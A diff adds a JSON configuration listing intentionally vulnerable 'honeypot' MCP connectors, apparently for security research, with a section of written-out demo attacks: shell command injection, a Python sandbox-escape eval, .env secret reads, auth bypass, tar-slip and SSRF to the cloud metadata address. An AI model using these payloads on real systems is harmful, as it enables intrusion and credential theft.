@@ -1,0 +1,30 @@
+{
+  "_readme": "FreeLLMs honeypot MCP connectors — paste the mcpServers object into your client config (Claude Desktop / Cursor / etc.). These are LIVE, intentionally-vulnerable research endpoints. Treat every tool output as untrusted demo data.",
+  "mcpServers": {
+    "freellms-api":      { "url": "https://api.freellms.net/sse",      "note": "unified bridge: agent_execute (bash), query_transactions (SQL), query_wallets (Cypher), access_files" },
+    "freellms-fs":       { "url": "https://fs.freellms.net/sse",       "note": "storage: read_file path traversal, restore_backup zip-slip, render_report SSTI" },
+    "freellms-shell":    { "url": "https://shell.freellms.net/sse",    "note": "shell proxy: run_command" },
+    "freellms-fetch":    { "url": "https://fetch.freellms.net/sse",    "note": "fetch_url SSRF/LFI, check_feed_health indirect prompt injection" },
+    "freellms-exec":     { "url": "https://exec.freellms.net/sse",     "note": "MCP Test Runner: run_test cmdi, set_mcp_config stored cross-tool injection" },
+    "freellms-auth":     { "url": "https://auth.freellms.net/sse",     "note": "auth bypass, JWT alg:none, mass assignment, open_session_v2 trust-flag bypass" },
+    "freellms-state":    { "url": "https://state.freellms.net/sse",    "note": "pickle deserialization RCE, temporally-gated restore" },
+    "freellms-checkpoint": { "url": "https://checkpoint.freellms.net/sse", "note": "SQLi, notebook_query eval RCE" },
+    "freellms-prompts":  { "url": "https://prompts.freellms.net/sse",  "note": "path traversal, unsafe YAML, tar-slip bundle import" },
+    "freellms-dev":      { "url": "https://dev.freellms.net/sse",      "note": "wave-2: open_remote, install_custom_node, run_terminal_profile, fetch_webhook, adb_devices_cmd + eval/prototype-pollution/traversal" },
+    "freellms-metrics":  { "url": "https://metrics.freellms.net/sse",  "note": "Go: journalctl cmdi, stored package install, SSRF, SSTI, cluster credentials" },
+    "freellms-agent":    { "url": "https://agent.freellms.net/sse",    "note": "autotrade agent persona" },
+    "freellms-mcp":      { "url": "https://mcp.freellms.net/sse",      "note": "graph/Cypher injection" },
+    "freellms-db":       { "url": "https://db.freellms.net/sse",       "note": "SQL + pickle load_session" },
+    "freellms-admin":    { "url": "http://admin.freellms.net/diag.php?host=127.0.0.1", "note": "PHP webshell-style: diag.php?host=;id (plain HTTP on purpose)" }
+  },
+  "demo_attacks": {
+    "1_remote_exec": "freellms-api → agent_execute {\"command\": \"id; hostname; ls -la /opt\"}  (jailed as uid 65534)",
+    "2_secret_harvest": "freellms-fs → read_file {\"path\": \"config/env/.env\"}  (decoy secrets)",
+    "3_auth_bypass": "freellms-auth → open_session_v2 {\"client_id\": \"demo\", \"trusted_client\": true} → privileged_call {\"op\": \"rotate_keys\"}",
+    "4_eval_rce": "freellms-checkpoint → notebook_query {\"expression\": \"[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='catch_warnings'][0]()._module.__builtins__['__import__']('os').popen('id').read()\"}",
+    "5_cmd_injection_go": "freellms-metrics → lookup_service_events {\"unit\": \"x; id; echo PWNED\", \"since\": \"1h ago\"}",
+    "6_tar_slip": "freellms-prompts → import_playbook_bundle {\"bundle_b64\": \"<crafted tar.gz with ../../ escape>\"}",
+    "7_php_webshell": "GET http://admin.freellms.net/diag.php?host=127.0.0.1;id  (uid=33 www-data)",
+    "8_ssrf": "freellms-dev → fetch_webhook {\"url\": \"http://169.254.169.254/latest/meta-data/\"}  (IMDS blocked by containment — observe the denial)"
+  }
+}
